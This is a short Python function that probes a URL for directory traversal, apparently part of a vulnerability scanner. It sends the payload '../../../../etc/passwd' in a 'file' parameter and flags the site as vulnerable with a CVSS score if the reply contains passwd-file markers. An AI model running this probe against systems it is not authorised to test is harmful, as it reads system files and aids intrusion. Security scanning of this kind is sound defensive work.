import requests

def check_directory_traversal(url, session=None):
    """
    Optimized path traversal prober with quick-timeout parameters.
    """
    if session is None:
        session = requests.Session()

    # Focused payload vector matching common web applications
    traversal_payloads = {
        "../../../../etc/passwd": ["root:", "/bin/bash"]
    }
    
    vulnerability_details = []

    for payload, structural_indicators in traversal_payloads.items():
        target_endpoint = f"{url}?file={payload}" if "?" not in url else f"{url}&file={payload}"
        
        try:
            # Drop timeout threshold to 1.5s
            response = session.get(target_endpoint, timeout=1.5)
            
            if any(indicator in response.text for indicator in structural_indicators):
                vulnerability_details.append(
                    f"Directory traversal confirmed using payload: {payload}"
                )
                return {
                    "vulnerable": True,
                    "severity": "High",
                    "cvss": 8.5,
                    "details": vulnerability_details
                }
        except requests.exceptions.RequestException:
            break

    return {
        "vulnerable": False,
        "severity": "Informational",
        "cvss": 0.0,
        "details": "No arbitrary path traversal indicators matched."
    }